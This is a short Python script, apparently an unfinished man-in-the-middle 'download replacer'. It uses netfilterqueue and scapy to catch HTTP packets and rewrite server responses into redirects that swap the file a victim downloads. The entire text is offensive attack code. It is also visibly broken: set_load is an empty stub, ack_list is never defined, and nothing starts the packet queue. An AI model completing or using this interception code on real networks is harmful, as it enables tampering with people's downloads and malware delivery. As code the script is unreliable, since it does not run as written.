#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy


def set_load(packet, load):
    pass


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print('request')
            print(scapy_packet)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print('replacing file...')
                modified_packet = set_load(scapy_packet, 'HTTP/1.1 moved')

                packet.set_payload(str(modified_packet))

    packet.accept()




